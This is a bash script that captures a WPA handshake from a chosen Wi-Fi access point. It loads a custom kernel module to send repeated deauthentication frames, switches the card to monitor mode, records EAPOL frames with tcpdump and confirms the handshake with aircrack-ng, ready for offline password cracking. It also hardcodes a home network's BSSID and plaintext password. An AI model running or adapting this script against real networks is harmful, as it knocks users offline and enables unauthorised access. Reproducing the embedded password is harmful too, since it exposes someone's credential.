#!/bin/bash
# grab_hs_v4.sh - Handshake capture: direct wpa_supplicant + petx5
#
# Key insight: must NOT start NetworkManager (it auto-connects to home AP,
# creating wrong PE session). Use wpa_supplicant directly so the ONLY
# PE session is for the target AP.
#
# Usage: grab_hs_v4.sh <TARGET_BSSID> <SSID> <CHANNEL> [ROUNDS]

TARGET_BSSID="$1"
TARGET_SSID="$2"
CH="$3"
ROUNDS="${4:-5}"
FREQ=$((2407 + CH * 5))
DRIVER="/tmp/qca_cld3_wlan.ko"
HOME_BSSID="8C:DE:F9:B3:9E:20"
HOME_PASS="9006609b29404a"

if [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_SSID" ] || [ -z "$CH" ]; then
    echo "Usage: $0 <TARGET_BSSID> <SSID> <CHANNEL> [ROUNDS]"
    exit 1
fi

echo "[*] Target: $TARGET_SSID ($TARGET_BSSID) ch$CH ($FREQ MHz)"

[ -f /tmp/petx5.ko ] || { cd /tmp && as -o petx5.o petx5.S && ld -r -o petx5.ko petx5.o; }

# Create wpa config for target ONLY
cat > /tmp/wpa_target.conf << WPAEOF
ctrl_interface=/tmp/wpa_ctrl
ap_scan=1
network={
    ssid="$TARGET_SSID"
    psk="dummypassword_notreal_1234567890"
    scan_freq=$FREQ
    bssid=$TARGET_BSSID
    key_mgmt=WPA-PSK
}
WPAEOF

rm -f /tmp/hs_r*.pcap /tmp/hs_final.pcap
got_handshake=0

for r in $(seq 1 $ROUNDS); do
    echo ""
    echo "========== ROUND $r/$ROUNDS =========="

    # ===== PHASE 1: Clean + Associate to target only =====
    echo "[P1] Associate to target ONLY (no NM)"

    # Kill everything
    systemctl stop NetworkManager 2>/dev/null
    killall -9 wpa_supplicant 2>/dev/null
    sleep 0.5
    # Double check
    killall -9 wpa_supplicant 2>/dev/null

    # Reload driver
    ip link set wlan0 down 2>/dev/null
    rmmod wlan 2>/dev/null
    sleep 1.5
    insmod $DRIVER
    sleep 4
    ip link set wlan0 up
    sleep 1

    # Verify NO PE sessions exist
    rmmod kfind 2>/dev/null
    insmod /tmp/petx5.ko 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[!] WARNING: PE session exists before connect - stale state!"
        rmmod kfind 2>/dev/null
    else
        echo "[+] No PE session (clean state)"
        rmmod kfind 2>/dev/null
    fi

    # Start wpa_supplicant to target ONLY
    rm -rf /tmp/wpa_ctrl; mkdir -p /tmp/wpa_ctrl
    wpa_supplicant -B -i wlan0 -c /tmp/wpa_target.conf -D nl80211 2>/dev/null
    echo "[*] wpa_supplicant started for $TARGET_SSID"

    # Tight loop: fire petx5 until it succeeds (PE session appears)
    SENT=0
    for i in $(seq 1 300); do
        rmmod kfind 2>/dev/null
        insmod /tmp/petx5.ko 2>/dev/null
        RC=$?
        if [ $RC -eq 0 ]; then
            SENT=$((SENT + 1))
            echo "[+] DEAUTH #$SENT at iter $i (t=$((i/10)).$((i%10))s)"
            # Print what BSSID was used
            dmesg | grep "petx5: session=" | tail -1
            rmmod kfind 2>/dev/null
            # Fire 9 more rapidly
            for extra in $(seq 1 9); do
                sleep 0.03
                rmmod kfind 2>/dev/null
                insmod /tmp/petx5.ko 2>/dev/null
                [ $? -eq 0 ] && SENT=$((SENT + 1))
                rmmod kfind 2>/dev/null
            done
            break
        fi
        rmmod kfind 2>/dev/null
        sleep 0.1
    done

    echo "[+] Total deauths: $SENT"
    if [ $SENT -gt 0 ]; then
        dmesg | grep "petx5: session=" | tail -1
    fi

    # Kill wpa_supplicant
    killall -9 wpa_supplicant 2>/dev/null

    # ===== PHASE 2: Monitor + Capture =====
    echo "[P2] Monitor mode on ch$CH"

    ip link set wlan0 down 2>/dev/null
    rmmod wlan 2>/dev/null
    sleep 1
    insmod $DRIVER con_mode_monitor=4
    sleep 2.5
    ip link set wlan0 up
    iw dev wlan0 set freq $FREQ

    # Capture EAPOL and assoc frames for 25 seconds
    CAPFILE="/tmp/hs_r${r}.pcap"
    timeout 25 tcpdump -i wlan0 -w "$CAPFILE" 2>/dev/null
    SIZE=$(stat -c%s "$CAPFILE" 2>/dev/null || echo 0)
    echo "[+] Captured: $SIZE bytes"

    # Check EAPOL
    EAPOL=$(tcpdump -r "$CAPFILE" -nn 2>/dev/null | grep -ci "EAPOL")
    echo "[*] EAPOL: $EAPOL"

    if [ "$EAPOL" -gt 0 ]; then
        echo "[!!!] EAPOL found!"
        cp "$CAPFILE" /tmp/hs_final.pcap
        aircrack-ng /tmp/hs_final.pcap 2>&1 | grep -i "handshake\|$TARGET_SSID\|$TARGET_BSSID" | head -5
        if aircrack-ng /tmp/hs_final.pcap 2>&1 | grep -qi "1 handshake"; then
            got_handshake=1
            echo "[!!!] HANDSHAKE CAPTURED!"
            break
        fi
    fi
done

echo ""
echo "========== RESULTS =========="
[ $got_handshake -eq 1 ] && echo "[*] SUCCESS - /tmp/hs_final.pcap" || echo "[*] No handshake"

# Restore
echo "[*] Restoring WiFi..."
ip link set wlan0 down 2>/dev/null
rmmod wlan 2>/dev/null
sleep 2
insmod $DRIVER
sleep 4
systemctl start NetworkManager 2>/dev/null
sleep 2
nmcli device wifi connect $HOME_BSSID password $HOME_PASS ifname wlan0 2>/dev/null
echo "[*] Done"
